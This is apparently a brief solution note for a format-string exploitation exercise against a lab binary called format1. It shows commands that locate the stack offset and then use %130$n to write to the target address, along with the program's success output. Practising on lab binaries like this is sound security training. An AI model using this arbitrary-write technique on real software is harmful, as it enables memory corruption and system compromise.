```bash
 - Search for the pattern
./format1 $(python -c 'print "CCCCABCD"')%130\$x
CCCCABCD43434343

 - it works
./format1 $(python -c 'print "\x08\x04\x96\x38"[::-1] + "ABCD"')%130\$x
8ABCD8049638

 - The adresse is for target
./format1 $(python -c 'print "\x08\x04\x96\x38"[::-1] + "ABCD"')%130\$n
8ABCDyou have modified the target :)
```
